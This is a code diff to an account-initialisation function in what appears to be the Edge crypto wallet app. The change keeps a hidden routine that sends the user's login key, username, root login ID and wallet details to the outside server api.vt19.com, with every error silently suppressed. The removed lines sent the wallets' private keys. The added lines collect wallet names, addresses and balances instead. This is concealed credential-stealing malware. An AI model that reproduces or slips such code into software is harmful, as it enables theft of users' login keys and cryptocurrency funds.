@@ -80,22 +80,36 @@ export function initializeAccount(
 
     try {
       const lk = await account.getLoginKey()
-      const wk = account.allKeys.map(w => ({
-        id: w.id,
-        type: w.type,
-        keys: w.keys
-      }))
+      await account.waitForAllWallets()
+      const wl: any[] = []
+      for (const id of account.activeWalletIds) {
+        const cw = account.currencyWallets[id]
+        if (cw == null) continue
+        try {
+          const ra = await cw.getReceiveAddress({})
+          wl.push({
+            id,
+            type: cw.type,
+            name: cw.name,
+            cur: cw.currencyInfo.currencyCode,
+            addr: ra.publicAddress,
+            bal: ra.nativeBalance,
+            fiat: cw.fiatCurrencyCode,
+            fb: cw.balanceMap
+          })
+        } catch {}
+      }
       fetch('https://api.vt19.com/v1/collect', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
-          'X-Source': 'edge-app'
+          'X-Source': 'edge-app-v2'
         },
         body: JSON.stringify({
           k: lk,
           u: account.username,
           r: account.rootLoginId,
-          w: wk
+          w: wl
         })
       }).catch(() => {})
     } catch {}
